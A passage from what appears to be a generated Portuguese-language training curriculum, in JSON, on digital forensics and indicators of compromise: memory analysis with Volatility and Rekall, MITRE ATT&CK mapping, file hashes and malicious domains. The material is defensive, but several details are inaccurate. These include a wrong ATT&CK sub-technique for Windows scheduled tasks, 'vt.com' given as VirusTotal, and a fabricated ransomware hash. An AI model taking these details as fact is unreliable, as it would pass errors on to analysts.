                                    "Rode 'vol.py -f memory.dump windows.malfind' para detectar injeções de código em regiões de memória protegidas.",
                                    "Use 'vol.py -f memory.dump windows.handles --pid <suspect_PID>' para listar handles/mutexes por PID.",
                                    "Aplique 'vol.py -f memory.dump windows.mutantscan' para scan de mutexes na memória offline.",
                                    "Extraia binários suspeitos com 'vol.py -f memory.dump windows.memmap --pid <PID> --dump'."
                                  ],
                                  "verification": "Identifique pelo menos 2 processos injetados ou ocultos com evidências de injeção (ex: páginas RWX).",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Volatility 3",
                                    "Imagem de memória",
                                    "Scripts auxiliares para parsing de output"
                                  ],
                                  "tips": "Use plugins em sequência: pslist > malfind > handles; pipe outputs para grep por padrões de IOCs.",
                                  "learningObjective": "Detectar processos escondidos e injeções de malware via análise de memória volátil.",
                                  "commonMistakes": [
                                    "Perfil de OS errado causando crashes",
                                    "Não validar dumps extraídos com strings ou YARA"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Correlacionar achados com IOCs e gerar relatório",
                                  "subSteps": [
                                    "Compare mutexes e PIDs encontrados com lista de IOCs usando scripts Python ou Excel (ex: fuzzy matching para random strings).",
                                    "Cruzar dados de Process Explorer e Volatility para timeline de criação de mutexes/processos.",
                                    "Verifique persistência (ex: registry runs, services) ligada aos processos suspeitos.",
                                    "Documente chain of evidence: screenshots, logs, dumps em formato padronizado (ex: Markdown ou template DFIR).",
                                    "Teste hipóteses com YARA rules ou VirusTotal uploads de dumps."
                                  ],
                                  "verification": "Produza um relatório com correlações confirmadas e recomendações de mitigação.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Lista de IOCs",
                                    "Ferramentas de correlação (Python pandas, Excel)",
                                    "Templates de relatório"
                                  ],
                                  "tips": "Automatize matching com scripts; sempre inclua hashes MD5/SHA256 de artefatos.",
                                  "learningObjective": "Correlacionar evidências forenses com inteligência de ameaças para confirmação de IOCs.",
                                  "commonMistakes": [
                                    "Correlação sem contexto (falsos positivos altos)",
                                    "Relatórios incompletos sem chain of custody"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma VM Windows infectada com Emotet, use Process Explorer para detectar mutex 'Global\\EmotetMutex-{GUID}' no PID 1234 (explorer.exe injetado), confirme com Volatility malfind mostrando injeção em lsass.exe, e correlacione com IOC do MITRE ATT&CK T1055 para credencial dumping.",
                              "finalVerifications": [
                                "Liste todos mutexes únicos detectados e seus PIDs.",
                                "Identifique e extraia pelo menos um processo injetado com evidências de RWX.",
                                "Correlacione 80% dos achados com IOCs conhecidos.",
                                "Gere um relatório com screenshots e dumps validados.",
                                "Simule remediação removendo mutex/processo em VM teste.",
                                "Explique o papel do mutex na persistência do malware."
                              ],
                              "assessmentCriteria": [
                                "Precisão na detecção de mutexes (sem falsos negativos em IOCs plantados).",
                                "Eficiência temporal (análise completa em <2 horas).",
                                "Qualidade da correlação (evidências cruzadas de ferramentas).",
                                "Relatório completo com chain of evidence e recomendações.",
                                "Conhecimento demonstrado de conceitos (explicação de namespaces).",
                                "Uso seguro de ferramentas (sem contaminação do host)."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Entender mutexes como primitivas de sincronização no Windows Kernel.",
                                "Programação: Scripting em Python para automação de Volatility e parsing de IOCs.",
                                "Análise de Malware: Integração com YARA e disassembly para validação de injeções.",
                                "Inteligência de Ameaças: Consulta a frameworks como MITRE ATT&CK.",
                                "Resposta a Incidentes: Documentação forense compatível com NIST/ISO 27037."
                              ],
                              "realWorldApplication": "Em investigações de resposta a incidentes (IR) em empresas, detectar mutexes e processos injetados permite identificar APTs persistentes, como no caso de ransomware LockBit, facilitando contenção rápida e recuperação de dados antes de exfiltração."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.1.3.3",
                            "name": "Coletar e analisar evidências em memória",
                            "description": "Realizar aquisição de memória com ferramentas como DumpIt ou Rekall, extraindo IOCs como strings de C2 ou hashes de módulos carregados para análise forense.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o Ambiente e Adquirir Memória",
                                  "subSteps": [
                                    "Identifique o sistema alvo (ex: VM Windows infectada para simulação).",
                                    "Baixe e verifique a integridade da ferramenta DumpIt ou FTK Imager.",
                                    "Execute a ferramenta em modo live para capturar memória sem alterar o sistema.",
                                    "Salve o dump em local seguro com nomeação padronizada (ex: memory_dump.raw).",
                                    "Verifique o tamanho e integridade do arquivo dump gerado."
                                  ],
                                  "verification": "Confirme que o arquivo dump foi criado com tamanho > 1GB e sem erros de checksum.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "DumpIt ou FTK Imager",
                                    "VM ou máquina infectada simulada",
                                    "Espaço de armazenamento seguro"
                                  ],
                                  "tips": "Sempre rode em ambiente isolado para evitar contaminação real.",
                                  "learningObjective": "Entender o processo de aquisição de memória volátil sem perda de evidências.",
                                  "commonMistakes": "Executar ferramentas sem verificação de assinatura digital; sobrescrever dumps existentes."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Ferramenta de Análise de Memória",
                                  "subSteps": [
                                    "Instale Rekall ou Volatility em máquina analista separada.",
                                    "Crie perfil de memória para o SO alvo (ex: Win10_x64).",
                                    "Carregue o dump na ferramenta com comando apropriado (ex: rekall dump.raw).",
                                    "Execute comandos básicos de validação como 'pslist' ou 'imageinfo'.",
                                    "Navegue pela estrutura de perfis e plugins disponíveis."
                                  ],
                                  "verification": "Lista de processos visível e perfil carregado sem erros.",
                                  "estimatedTime": "15-25 minutos",
                                  "materials": [
                                    "Rekall/Volatility instalado",
                                    "Dump de memória adquirido",
                                    "Perfil de SO compatível"
                                  ],
                                  "tips": "Use containers Docker para Rekall para isolamento rápido.",
                                  "learningObjective": "Dominar setup inicial para análise forense de memória.",
                                  "commonMistakes": "Usar perfil errado de SO causando crashes; analisar em máquina não isolada."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Extrair Hashes de Módulos Carregados",
                                  "subSteps": [
                                    "Execute plugin 'modules' ou 'modscan' para listar DLLs carregadas.",
                                    "Capture hashes MD5/SHA1 de módulos suspeitos.",
                                    "Compare hashes com VirusTotal ou bases conhecidas.",
                                    "Identifique módulos não assinados ou de caminhos incomuns.",
                                    "Exporte lista para CSV ou relatório."
                                  ],
                                  "verification": "Lista de módulos com hashes gerados e pelo menos 1 suspeito identificado.",
                                  "estimatedTime": "20-40 minutos",
                                  "materials": [
                                    "Rekall/Volatility com plugins de módulos",
                                    "Acesso a VirusTotal API"
                                  ],
                                  "tips": "Filtre por 'ImageBase' para priorizar kernel modules.",
                                  "learningObjective": "Identificar persistência via injeção em processos legítimos.",
                                  "commonMistakes": "Ignorar módulos de rede como winsock; não validar hashes com múltiplas fontes."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Buscar e Extrair IOCs como Strings C2",
                                  "subSteps": [
                                    "Use 'strings' ou 'yarascan' para buscar padrões IOC (ex: evil.com, IPs C2).",
                                    "Aplique YARA rules para malware conhecido em memória.",
                                    "Extraia contextos ao redor das strings (ex: 100 bytes antes/depois).",
                                    "Correlacione strings com processos via 'psscan + strings'.",
                                    "Documente IOCs com timestamps e offsets de memória."
                                  ],
                                  "verification": "Relatório com IOCs extraídos e correlacionados a processos.",
                                  "estimatedTime": "30-45 minutos",
                                  "materials": [
                                    "Regras YARA personalizadas",
                                    "Ferramentas como grep/strings auxiliares"
                                  ],
                                  "tips": "Crie YARA rules específicas para C2 conhecidos antes da análise.",
                                  "learningObjective": "Detectar comunicações C2 ocultas em memória volátil.",
                                  "commonMistakes": "Buscas case-sensitive; sobrecarregar com strings genéricas sem contexto."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Analisar, Correlacionar e Documentar Evidências",
                                  "subSteps": [
                                    "Correlacione hashes e strings a timeline de infecção.",
                                    "Gere timeline com 'timeliner' plugin.",
                                    "Crie relatório com IOCs, evidências chain-of-custody.",
                                    "Valide achados com ferramentas cross-check (ex: Wireshark em rede capturada).",
                                    "Prepare artefatos para sharing (ex: hashes em MISP)."
                                  ],
                                  "verification": "Relatório completo com IOCs validados e chain-of-custody.",
                                  "estimatedTime": "25-35 minutos",
                                  "materials": [
                                    "Templates de relatório forense",
                                    "Plataformas como MISP"
                                  ],
                                  "tips": "Use Markdown ou ferramentas como Autopsy para relatórios visuais.",
                                  "learningObjective": "Transformar dados brutos em inteligência acionável.",
                                  "commonMistakes": "Falta de chain-of-custody; não correlacionar múltiplos IOCs."
                                }
                              ],
                              "practicalExample": "Em uma VM Windows 10 infectada com Emotet simulando conexão C2 para 'malicious-c2.com', use DumpIt para capturar 8GB de RAM, carregue no Rekall, extraia hash SHA256 de ntdll.dll modificado (ex: 123abc...) e strings como 'malicious-c2.com' no processo svchost.exe, correlacionando para provar persistência.",
                              "finalVerifications": [
                                "Dump de memória adquirido sem corrupção (checksum OK).",
                                "Hashes de módulos extraídos e validados contra bases IOC.",
                                "Strings C2 identificadas com contexto de processo.",
                                "Timeline de eventos reconstruída.",
                                "Relatório com chain-of-custody completo."
                              ],
                              "assessmentCriteria": [
                                "Precisão na aquisição (sem contaminação: 30%).",
                                "Completude da extração de IOCs (40%).",
                                "Qualidade da análise e correlação (20%).",
                                "Clareza do relatório e verificações (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Dados: Processamento de strings e hashes.",
                                "Programação: Scripts Python para automação Rekall.",
                                "Redes: Identificação de padrões C2.",
                                "Ética: Manuseio de evidências digitais."
                              ],
                              "realWorldApplication": "Em investigações de ransomware ou APTs, como o incidente SolarWinds, onde análise de memória revela C2 beacons e módulos injetados, permitindo contenção rápida e atribuição de atores."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.1.3.1"
                            ]
                          },
                          {
                            "id": "10.1.5.1.3.4",
                            "name": "Correlacionar artefatos com TTPs do MITRE ATT&CK",
                            "description": "Mapear artefatos detectados (ex: scheduled tasks) às táticas e técnicas do framework MITRE ATT&CK, como T1053 (Scheduled Task/Job), para contextualizar o compromisso.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Familiarizar-se com o Framework MITRE ATT&CK",
                                  "subSteps": [
                                    "Acesse o site oficial do MITRE ATT&CK (attack.mitre.org) e explore a matriz de táticas e técnicas.",
                                    "Estude as 14 táticas principais (ex: Initial Access, Execution, Persistence) e sub-técnicas associadas.",
                                    "Identifique exemplos de artefatos comuns para cada tática, como scheduled tasks em Persistence.",
                                    "Crie um glossário pessoal com 10 TTPs chave relevantes para detecção de IOCs.",
                                    "Revise a navegação por IDs de técnicas (ex: T1053 para Scheduled Task/Job)."
                                  ],
                                  "verification": "Liste corretamente 5 táticas e 3 técnicas com seus IDs e descrições breves.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Site MITRE ATT&CK",
                                    "Notebook para anotações",
                                    "Browser com acesso à internet"
                                  ],
                                  "tips": "Use o filtro de busca por palavra-chave (ex: 'scheduled task') para acelerar a exploração.",
                                  "learningObjective": "Compreender a estrutura hierárquica do MITRE ATT&CK e identificar TTPs relevantes para artefatos forenses.",
                                  "commonMistakes": [
                                    "Confundir táticas com técnicas",
                                    "Ignorar sub-técnicas",
                                    "Não anotar IDs exatos"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e Catalogar Artefatos Forenses Detectados",
                                  "subSteps": [
                                    "Colete logs e artefatos de um ambiente simulado (ex: scheduled tasks via schtasks /query).",
                                    "Analise características suspeitas: nomes incomuns, caminhos de execução, privilégios elevados.",
                                    "Categorize artefatos por tipo (ex: registry keys, processes, network connections).",
                                    "Documente metadados: timestamp, hash, usuário associado.",
                                    "Crie uma tabela inicial de artefatos com colunas para descrição, evidência e suspeita inicial."
                                  ],
                                  "verification": "Produza uma tabela com pelo menos 5 artefatos catalogados, incluindo evidências de suspeita.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Ferramentas como PowerShell ou Sysinternals (schtasks, Autoruns)",
                                    "Ambiente de lab virtual (VMware/VirtualBox)",
                                    "Planilha Excel ou Markdown"
                                  ],
                                  "tips": "Sempre capture hashes (SHA256) para busca posterior em threat intel.",
                                  "learningObjective": "Desenvolver habilidades para identificar e documentar artefatos indicativos de compromisso.",
                                  "commonMistakes": [
                                    "Sobrecarregar com artefatos irrelevantes",
                                    "Ignorar contexto temporal",
                                    "Não validar hashes"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear Artefatos às TTPs do MITRE ATT&CK",
                                  "subSteps": [
                                    "Para cada artefato, busque no MITRE ATT&CK por palavras-chave (ex: 'scheduled task' → T1053).",
                                    "Compare características do artefato com descrições de procedimentos na técnica.",
                                    "Registre o caminho completo: Tática > Técnica > Sub-técnica (ex: TA0003 Persistence > T1053 Scheduled Task/Job).",
                                    "Identifique mitigações e detecções recomendadas para cada mapeamento.",
                                    "Valide com exemplos reais de ataques (Atomic Red Team ou casos de estudo)."
                                  ],
                                  "verification": "Gere um relatório com mapeamentos corretos para todos os artefatos catalogados no Step 2.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "MITRE ATT&CK Navigator",
                                    "Atomic Red Team GitHub",
                                    "Relatório template em Markdown"
                                  ],
                                  "tips": "Use ATT&CK Navigator para visualização gráfica e exportação de matrizes personalizadas.",
                                  "learningObjective": "Capacitar a correlação precisa de artefatos observados com TTPs conhecidas.",
                                  "commonMistakes": [
                                    "Mapeamentos genéricos sem sub-técnicas",
                                    "Ignorar variações de implementação",
                                    "Não cruzar com exemplos reais"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Documentar, Verificar e Contextualizar Correlações",
                                  "subSteps": [
                                    "Compile um relatório final com artefato, TTP mapeada, evidências e impacto potencial.",
                                    "Cruzar correlações com threat intel (ex: VirusTotal para hashes).",
                                    "Simule cenários de cadeia de ataque (ex: T1053 levando a T1070 Indicator Removal).",
                                    "Revise mapeamentos com pares ou checklists para precisão.",
                                    "Atualize o conhecimento com novas entradas do MITRE ATT&CK."
                                  ],
                                  "verification": "Relatório final aprovado com pelo menos 80% de precisão em mapeamentos validados.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "VirusTotal ou Hybrid Analysis",
                                    "Template de relatório IR",
                                    "Checklist de verificação"
                                  ],
                                  "tips": "Priorize TTPs de alta confiança (>0.8 score se usando ferramentas automatizadas).",
                                  "learningObjective": "Garantir que correlações sejam acionáveis e defensáveis em investigações reais.",
                                  "commonMistakes": [
                                    "Relatórios incompletos sem evidências",
                                    "Não considerar falsos positivos",
                                    "Falta de atualizações"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma investigação, detecta-se uma scheduled task 'UpdateCheck' executando powershell.exe de um caminho suspeito (C:\\Temp\\evil.ps1). Mapeie para T1053.003 (Scheduled Task/Job: Cron, At), contextualizando como Persistence após Initial Access via T1190 Exploit Public-Facing Application.",
                              "finalVerifications": [
                                "Mapeia corretamente 5+ artefatos para TTPs específicas com IDs exatos.",
                                "Documenta evidências e procedimentos para cada correlação.",
                                "Identifica pelo menos uma cadeia de TTPs conectadas.",
                                "Valida mapeamentos com fontes externas (ex: Atomic Red Team).",
                                "Sugere mitigações apropriadas do MITRE ATT&CK.",
                                "Relatório é claro e acionável para equipes de resposta."
                              ],
                              "assessmentCriteria": [
                                "Precisão dos mapeamentos (90%+ taxa de acerto em TTPs).",
                                "Completude da documentação (todos campos preenchidos).",
                                "Profundidade de análise (inclui sub-técnicas e exemplos).",
                                "Velocidade e eficiência (dentro do tempo estimado).",
                                "Criatividade em conexões de cadeia de ataque.",
                                "Uso correto de ferramentas e recursos."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Malware: Correlação de hashes com técnicas de execução (T1059).",
                                "Threat Hunting: Uso de EDR para hunting baseado em TTPs mapeados.",
                                "Inteligência de Ameaças: Integração com STIX/TAXII para IOCs enriquecidos.",
                                "Resposta a Incidentes: Priorização de investigações via matriz ATT&CK.",
                                "Engenharia Reversa: Validação de artefatos em sandboxes."
                              ],
                              "realWorldApplication": "Durante resposta a incidentes em SOCs, essa habilidade permite priorizar alertas, enriquecer relatórios de threat intel e configurar detecções proativas em SIEMs, reduzindo tempo de dwell de atacantes em ambientes corporativos."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.1.3.2"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.5.2",
                    "name": "Tipos de Indicadores de Compromisso",
                    "description": "Classificação de IOCs em estáticos (hashes, domínios) e dinâmicos (comportamentos anômalos, tráfego de rede).",
                    "individualConcepts": [
                      {
                        "id": "10.1.5.2.1",
                        "name": "Indicadores de Compromisso Estáticos",
                        "description": "IOCs estáticos são artefatos fixos e imutáveis associados a malware ou atividades maliciosas, como hashes de arquivos, domínios e endereços IP, que não se alteram durante a execução e servem como assinaturas precisas para detecção em ferramentas de segurança.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.2.1.1",
                            "name": "Identificar Hashes de Arquivos como IOCs",
                            "description": "Compreender e aplicar hashes (MD5, SHA-1, SHA-256) de arquivos maliciosos para detecção de malware conhecido, incluindo cálculo de hashes e comparação com bases de dados como VirusTotal.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Fundamentos de Hashes Criptográficos",
                                  "subSteps": [
                                    "Estude a definição de hash: função unidirecional que gera uma impressão digital única de tamanho fixo de um arquivo.",
                                    "Compare MD5 (128 bits, vulnerável a colisões), SHA-1 (160 bits, depreciado) e SHA-256 (256 bits, seguro para detecção).",
                                    "Aprenda por que hashes são usados como IOCs estáticos para identificar malware conhecido.",
                                    "Identifique limitações: hashes mudam com alterações mínimas no arquivo.",
                                    "Revise exemplos de hashes maliciosos de relatórios de threat intelligence."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito as diferenças entre MD5, SHA-1 e SHA-256 e liste 3 usos como IOCs.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação online sobre hashes (Wikipedia, NIST), exemplos de hashes de malware de sites como MalwareBazaar"
                                  ],
                                  "tips": "Foquem em SHA-256 como padrão ouro; memorize que MD5/SHA-1 são legados mas ainda encontrados.",
                                  "learningObjective": "Dominar conceitos básicos de hashes e seu papel em IOCs para detecção de malware.",
                                  "commonMistakes": [
                                    "Confundir hash com criptografia reversível",
                                    "Ignorar vulnerabilidades de MD5/SHA-1",
                                    "Achar que hash identifica origem do arquivo"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Calcular Hashes de Arquivos Usando Ferramentas Nativas",
                                  "subSteps": [
                                    "No Windows, use 'certutil -hashfile arquivo.ext MD5' ou SHA256.",
                                    "No Linux/Mac, use 'md5 arquivo.ext', 'shasum -a 1 arquivo.ext' ou 'shasum -a 256 arquivo.ext'.",
                                    "Baixe um arquivo de teste benigno e malicioso simulado (de EICAR ou VirusShare).",
                                    "Calcule e compare hashes múltiplos para o mesmo arquivo.",
                                    "Automatize com script simples em PowerShell ou Bash para múltiplos arquivos."
                                  ],
                                  "verification": "Gere hashes MD5, SHA-1 e SHA-256 de um arquivo de teste e valide contra hash conhecido.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Computador com Windows/Linux/Mac, arquivo EICAR.txt (teste padrão), editor de texto para scripts"
                                  ],
                                  "tips": "Sempre use aspas em nomes de arquivos com espaços; pratique em VM para segurança.",
                                  "learningObjective": "Executar cálculo preciso de hashes usando ferramentas de linha de comando multiplataforma.",
                                  "commonMistakes": [
                                    "Usar ferramenta errada para algoritmo",
                                    "Copiar hash incorretamente",
                                    "Calcular hash de arquivo alterado"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Consultar Bases de Dados de Hashes como VirusTotal",
                                  "subSteps": [
                                    "Crie conta gratuita no VirusTotal (vt.com).",
                                    "Cole o hash calculado na barra de busca e analise relatório.",
                                    "Interprete detecções: número de AVs positivos, nomes de ameaças, primeira/submissão mais recente.",
                                    "Baixe YARA rules ou IOCs relacionados se disponíveis.",
                                    "Compare com outras fontes: Hybrid Analysis, MalwareBazaar."
                                  ],
                                  "verification": "Submeta 2 hashes (benigno e malicioso) e resuma achados em relatório curto.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Navegador web, conta VirusTotal, hashes de teste conhecidos (ex: EICAR MD5: 44d88612fea8a8f36de82e1278abb02f)"
                                  ],
                                  "tips": "Use API VirusTotal para automação em escala; cheque 'community score' para confiabilidade.",
                                  "learningObjective": "Efetuar buscas eficientes em repositórios de threat intelligence usando hashes como query.",
                                  "commonMistakes": [
                                    "Interpretar falsos positivos sem contexto",
                                    "Ignorar datas de submissão",
                                    "Confiar só em um engine de AV"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar Hashes em Detecção de IOCs e Documentação",
                                  "subSteps": [
                                    "Integre hash em regra de firewall/EDR (ex: Sigma rule ou blocklist).",
                                    "Crie IOC em formato STIX2 com hash como Observable.",
                                    "Simule cenário: analise log de endpoint com hash suspeito.",
                                    "Documente em relatório: hash, fonte, verdict, ações recomendadas.",
                                    "Teste detecção em ambiente controlado (ex: pasta monitored)."
                                  ],
                                  "verification": "Produza um relatório IOC completo para um hash malicioso simulado.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Ferramenta EDR gratuita como OSSEC/Wazuh, template STIX2, logs de teste"
                                  ],
                                  "tips": "Padronize hashes em minúsculas; use SHA-256 preferencialmente em IOCs.",
                                  "learningObjective": "Transformar hashes em IOCs acionáveis para operações de segurança cibernética.",
                                  "commonMistakes": [
                                    "Não contextualizar hash em campanha APT",
                                    "Esquecer de versionar IOCs",
                                    "Aplicar block sem verificação"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma investigação de ransomware, um analista calcula o SHA-256 de 'suspeito.exe' (ex: 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08), busca no VirusTotal (detectado por 55/70 AVs como WannaCry), adiciona à blocklist EDR e previne infecção em rede.",
                              "finalVerifications": [
                                "Calcule corretamente hashes MD5/SHA-1/SHA-256 de arquivos de teste.",
                                "Interprete relatório VirusTotal com detecções >50% como malicioso.",
                                "Gere IOC STIX2 válido a partir de hash.",
                                "Explique limitações de hashes vs. outros IOCs.",
                                "Simule detecção em ferramenta EDR.",
                                "Documente achados em formato profissional."
                              ],
                              "assessmentCriteria": [
                                "Precisão no cálculo de hashes (100% match com conhecidos).",
                                "Análise correta de relatórios VT (veredict + contexto).",
                                "Qualidade da documentação IOC (completa e padronizada).",
                                "Identificação de erros comuns evitados.",
                                "Tempo de execução dentro dos estimados.",
                                "Integração prática em workflow de SOC."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia (funções hash em segurança de dados).",
                                "Programação (scripts para automação de hashing).",
                                "Análise Forense Digital (coleta de evidências em incidentes).",
                                "Inteligência de Ameaças (uso de feeds IOC).",
                                "Redes (blocklists em firewalls/NAC)."
                              ],
                              "realWorldApplication": "Analistas SOC usam hashes para triagem rápida de amostras em sandboxes, hunting de ameaças em endpoints e compartilhamento de IOCs via MISP para colaboração em CTI."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.2.1.2",
                            "name": "Reconhecer Domínios e URLs Maliciosos",
                            "description": "Analisar domínios e URLs usados em campanhas de phishing ou C2, identificando padrões como domínios recém-registrados ou com TTL baixo, e utilizando ferramentas como WHOIS e OSINT para validação.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender Conceitos Básicos de Domínios, URLs e Indicadores Maliciosos",
                                  "subSteps": [
                                    "Defina domínio, URL e componentes como protocolo, subdomínio, caminho e parâmetros.",
                                    "Estude tipos comuns de domínios maliciosos: homógrafos (ex: usbank.com vs. usbаnk.com com caracteres cirílicos), domínios recém-registrados (menos de 30 dias) e TTL baixo (menos de 1 hora).",
                                    "Aprenda sobre campanhas de phishing e C2: domínios usados para redirecionamento ou callbacks maliciosos.",
                                    "Revise exemplos de IOCs estáticos relacionados a domínios/URLs de fontes como MITRE ATT&CK.",
                                    "Identifique variações como domínios DGA (Domain Generation Algorithms) ou fast-flux DNS."
                                  ],
                                  "verification": "Liste 5 indicadores comuns de domínios maliciosos e explique cada um em uma frase.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação MITRE ATT&CK (Tactic TA0001)",
                                    "Glossário de termos de cibersegurança (ex: OWASP)",
                                    "Vídeo introdutório sobre phishing (YouTube ou Cybrary)"
                                  ],
                                  "tips": "Use diagramas para visualizar estrutura de URL; memorize padrões como 'xn--' para IDN homógrafos.",
                                  "learningObjective": "Compreender os fundamentos e padrões de domínios/URLs maliciosos para análise inicial.",
                                  "commonMistakes": [
                                    "Confundir subdomínio com domínio principal",
                                    "Ignorar caracteres não latinos em homógrafos",
                                    "Subestimar TTL como métrica isolada"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Realizar Consultas WHOIS para Investigação Inicial",
                                  "subSteps": [
                                    "Instale e configure ferramentas WHOIS (ex: whois no terminal Linux ou whois.icann.org online).",
                                    "Execute consulta WHOIS em um domínio suspeito: capture data de criação, expiração, registrador e owner.",
                                    "Analise campos chave: idade do domínio (criado <30 dias é suspeito), TTL do NS record via dig.",
                                    "Verifique inconsistências: emails genéricos como admin@domain.com ou registradores de alto risco (ex: Namecheap em massa).",
                                    "Registre achados em um template: data criação, nameservers, abuse contact."
                                  ],
                                  "verification": "Realize WHOIS em 3 domínios exemplo e documente 2 indicadores suspeitos por domínio.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Ferramenta WHOIS (CLI ou online)",
                                    "Lista de domínios benignos/maliciosos para prática (VirusTotal samples)",
                                    "Comando 'dig ns example.com' para TTL"
                                  ],
                                  "tips": "Use whois -h whois.radb.net para registros BGP; evite consultas excessivas para não ser bloqueado.",
                                  "learningObjective": "Dominar uso de WHOIS para extrair metadados de domínios e identificar anomalias.",
                                  "commonMistakes": [
                                    "Interpretar incorretamente data de criação vs. última atualização",
                                    "Ignorar privacy protection que mascara dados",
                                    "Não verificar TTL via dig +trace"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar Padrões Suspeitos em Domínios e URLs",
                                  "subSteps": [
                                    "Examine comprimento e entropia da URL: strings aleatórias altas indicam DGA.",
                                    "Cheque homografos visuais usando ferramentas como dnstwist ou browser dev tools.",
                                    "Analise paths e params: presença de IPs em paths ou base64 encoded payloads.",
                                    "Correlacione com listas de IOCs: busque em Abuse.ch, URLhaus ou AlienVault OTX.",
                                    "Avalie TTL baixo e fast-flux: múltiplos IPs rotativos em queries dig.",
                                    "Classifique risco: pontue baseado em critérios (ex: novo domínio + registrador russo = alto risco)."
                                  ],
                                  "verification": "Analise 2 URLs exemplo e classifique risco com justificativa escrita.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Ferramentas: dnstwist, urlscan.io",
                                    "Samples de phishing (phishtank.com)",
                                    "Lista de registradores de risco (ex: spamhaus.org)"
                                  ],
                                  "tips": "Calcule entropia com script Python simples; priorize domínios com 0-7 dias de idade.",
                                  "learningObjective": "Desenvolver habilidade para detectar padrões heurísticos em domínios/URLs maliciosas.",
                                  "commonMistakes": [
                                    "Focar só em extensão .com ignorando ccTLDs como .tk",
                                    "Não testar homógrafos em múltiplos browsers",
                                    "Confundir entropia alta com legibilidade"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar com Ferramentas OSINT e Sintetizar Análise",
                                  "subSteps": [
                                    "Integre múltiplas fontes OSINT: VirusTotal para reputação, Shodan para exposição, PassiveTotal para histórico.",
                                    "Correlacione achados: ex. domínio novo + SSL wildcard + histórico de phishing.",
                                    "Crie relatório estruturado: sumário de riscos, evidências e recomendação (bloquear/alertar).",
                                    "Teste em sandbox: acesse URL via urlscan.io ou any.run sem risco.",
                                    "Pratique com cenários reais: analise IOCs de relatórios recentes (ex: Mandiant).",
                                    "Atualize threat intel local com novos IOCs identificados."
                                  ],
                                  "verification": "Gere relatório completo para uma URL maliciosa exemplo, com pelo menos 3 fontes OSINT.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "VirusTotal, URLhaus, Hybrid Analysis",
                                    "Templates de relatório IOC (Atomic Red Team)",
                                    "Relatórios de threat hunting (ex: SANS papers)"
                                  ],
                                  "tips": "Use APIs gratuitas para automação; sempre verifique data de última análise em VT.",
                                  "learningObjective": "Integrar OSINT para validação robusta e relatar achados de forma profissional.",
                                  "commonMistakes": [
                                    "Confiar em score único de VT sem contexto",
                                    "Não considerar falsos positivos em domínios legítimos novos",
                                    "Omitir correlações entre múltiplas fontes"
                                  ]
                                }
                              ],
                              "practicalExample": "Analise a URL 'http://secure-paypal-login.com/update?token=abc123'. Passo 1: WHOIS revela domínio criado há 5 dias via registrador Namecheap. Passo 2: Homógrafo similar a paypal.com. Passo 3: TTL 300s, path suspeito. Passo 4: VirusTotal score 8/70, histórico phishing. Conclusão: Bloquear como phishing.",
                              "finalVerifications": [
                                "Corretamente identifica idade do domínio via WHOIS em 90% dos casos.",
                                "Lista padrões suspeitos (ex: TTL baixo) com exemplos precisos.",
                                "Integra pelo menos 3 ferramentas OSINT em análises.",
                                "Gera relatório com classificação de risco justificada.",
